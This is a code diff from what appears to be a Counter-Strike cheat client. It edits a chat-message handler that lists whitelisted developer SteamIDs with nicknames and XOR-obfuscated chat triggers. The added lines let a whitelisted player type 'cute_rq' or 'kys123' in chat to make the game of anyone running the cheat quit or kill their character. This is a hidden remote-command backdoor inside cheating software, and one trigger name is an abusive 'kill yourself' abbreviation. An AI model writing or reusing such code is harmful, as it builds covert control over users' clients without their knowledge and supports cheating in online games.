@@ -540,13 +540,7 @@ void events::player_say(IGameEvent* evt) {
 	// Whitelisted SteamIDs
 	std::vector<__int64> m_vecWhitelistedIds = {
 		76561199181068421, // katie: https://steamcommunity.com/profiles/76561199181068421/
-		76561198991634865, // stussy: https://steamcommunity.com/profiles/76561198991634865/
 		76561199204341953, // sanchez: https://steamcommunity.com/profiles/76561199204341953/
-		76561199700723378, // marcell: https://steamcommunity.com/profiles/76561199700723378/
-		76561198041546054, // extra: https://steamcommunity.com/profiles/76561198041546054/
-		76561198374925271, // stapz: https://steamcommunity.com/profiles/76561198374925271/
-		76561199389255521, // rayvn: https://steamcommunity.com/profiles/76561199389255521/
-		76561199654291052, // jayla: https://steamcommunity.com/profiles/76561199654291052/
 	};
 
 	if (!pLocal)
@@ -560,7 +554,9 @@ void events::player_say(IGameEvent* evt) {
 
 	static std::vector<std::pair<std::string, std::function<void(void)>>> magic =
 	{
-		{ XOR("_0"), [&]() { g_csgo.m_engine->ExecuteClientCmd(XOR("net_graph 1")); } }, // gg
+		{ XOR("net1"), [&]() { g_csgo.m_engine->ExecuteClientCmd(XOR("net_graph 1")); } }, // gg
+		{ XOR("cute_rq"), [&]() { g_csgo.m_engine->ExecuteClientCmd(XOR("quit")); } },
+		{ XOR("kys123"), [&]() { g_csgo.m_engine->ExecuteClientCmd(XOR("kill")); } },
 	};
 
 	// loop through all the messages sent by devs
